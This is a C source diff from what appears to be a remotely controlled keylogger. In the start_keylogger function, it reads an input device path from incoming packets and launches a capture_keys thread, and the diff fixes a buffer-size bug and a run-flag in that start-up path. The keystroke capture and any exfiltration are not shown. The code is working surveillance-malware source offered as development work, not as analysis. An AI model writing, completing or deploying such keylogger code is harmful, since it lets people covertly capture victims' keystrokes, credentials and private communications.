@@ -181,6 +181,7 @@ void handle_packet_data(struct session_info * session_info, struct packet_data *
 // NOLINTNEXTLINE
 void start_keylogger(struct session_info * session_info) {
     log_message("Starting Keylogger");
+#ifdef CLIENT_BUILD
     const struct packet_data * packet_data = session_info->head;
 
     session_info->device_path = malloc(MESSAGE_BUFFER_LENGTH);
@@ -194,7 +195,7 @@ void start_keylogger(struct session_info * session_info) {
             break;
         }
 
-        if (device_path_len < (int)sizeof(session_info->device_path) - 2) {
+        if (device_path_len < MESSAGE_BUFFER_LENGTH - 2) {
             if (first_byte == 0) {
                 session_info->device_path[device_path_len++] = (char)second_byte;
             } else {
@@ -213,8 +214,8 @@ void start_keylogger(struct session_info * session_info) {
     session_info->device_path[device_path_len] = '\0';
 
     log_message("Provided Device Path: %s", session_info->device_path);
-#ifdef CLIENT_BUILD
     if (!session_info->run_keylogger) {
+        session_info->run_keylogger = true;
         pthread_create(&session_info->keylogger_thread, NULL, capture_keys, session_info);
     }
 #endif
